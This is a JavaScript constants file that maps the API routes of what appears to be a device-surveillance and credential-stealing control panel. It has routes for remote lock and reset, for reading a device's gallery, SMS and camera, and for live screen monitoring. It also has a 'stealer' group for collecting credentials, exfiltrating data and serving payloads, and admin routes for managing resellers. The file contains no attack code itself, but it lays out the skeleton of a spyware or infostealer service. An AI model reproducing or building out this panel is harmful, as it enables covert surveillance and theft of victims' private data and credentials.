const API_ENDPOINTS = {
  AUTH: {
    LOGIN: '/auth/login',
    LOGOUT: '/auth/logout',
    VERIFY: '/auth/verify'
  },
  DEVICES: {
    LIST: '/devices',
    DETAIL: '/devices/:id',
    STATUS: '/devices/:id/status',
    LOCK: '/devices/:id/lock',
    UNLOCK: '/devices/:id/unlock',
    RESET: '/devices/:id/reset',
    GALLERY: '/devices/:id/gallery',
    SMS: '/devices/:id/sms',
    CAMERA: '/devices/:id/camera',
    MONITOR: '/devices/:id/monitor'
  },
  MONITORING: {
    LIVE: '/monitoring/live',
    CAMERA: '/monitoring/camera',
    SCREEN: '/monitoring/screen'
  },
  STEALER: {
    COLLECT: '/stealer/collect',
    CREDENTIALS: '/stealer/credentials',
    EXFILTRATE: '/stealer/exfiltrate',
    PAYLOAD: '/stealer/payload'
  },
  ADMIN: {
    USERS: '/admin/users',
    USER: '/admin/users/:id',
    RESELLERS: '/admin/resellers',
    DEVICES: '/admin/devices',
    STATS: '/admin/stats',
    ACTIVITIES: '/admin/activities'
  },
  USER: {
    PROFILE: '/user/profile',
    DEVICES: '/user/devices'
  }
};

export default API_ENDPOINTS;
